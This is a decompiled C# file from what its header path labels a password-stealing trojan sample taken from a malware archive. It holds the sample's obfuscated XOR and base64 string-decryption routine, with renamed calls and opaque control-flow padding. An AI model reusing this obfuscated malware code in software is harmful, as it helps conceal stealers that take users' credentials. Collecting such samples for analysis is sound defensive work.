// Decompiled with JetBrains decompiler
// Type: StringDecrypt
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Text;

public static class StringDecrypt
{
  public static string Xor(string input, string stringKey)
  {
    StringBuilder pathList1 = MenuItemStream.RegisterFile();
    for (int generatorCache = TemplateService.RegisterFile(2024); generatorCache < DeploymentType.RegisterFile((object) input); generatorCache += TemplateService.RegisterFile(2028))
    {
      int pathList2 = (int) FormFactory.RegisterFile((object) input, generatorCache) ^ (int) FormFactory.RegisterFile((object) stringKey, generatorCache % DeploymentType.RegisterFile((object) stringKey));
      ConfigService.RegisterFile((object) pathList1, StreamProvider.RegisterFile(2134), (object) ViewEditor.RegisterFile(pathList2));
    }
label_3:
    switch (7)
    {
      case 0:
        goto label_3;
      default:
        if (false)
        {
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (StringDecrypt.Xor);
        }
        return DirectoryTree.RegisterFile((object) pathList1);
    }
  }

  private static string RegisterFile(string pathList) => StringDecrypt.RegisterFile(Method.RegisterFile(ConnectionContext.RegisterFile((object) pathList), TemplateService.RegisterFile(2032), DeploymentType.RegisterFile((object) pathList)));

  private static string RegisterFile(byte[] pathList) => MethodFactory.RegisterFile((object) ClientContext.RegisterFile(), pathList);

  public static string Read(string b64, string stringKey)
  {
    try
    {
      if (!StreamStream.RegisterFile(b64))
        return StringDecrypt.RegisterFile(SolutionScope.RegisterFile(StringDecrypt.RegisterFile(b64), stringKey));
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (StringDecrypt.Read);
          }
          return string.Empty;
      }
    }
    catch
    {
      return b64;
    }
  }
}
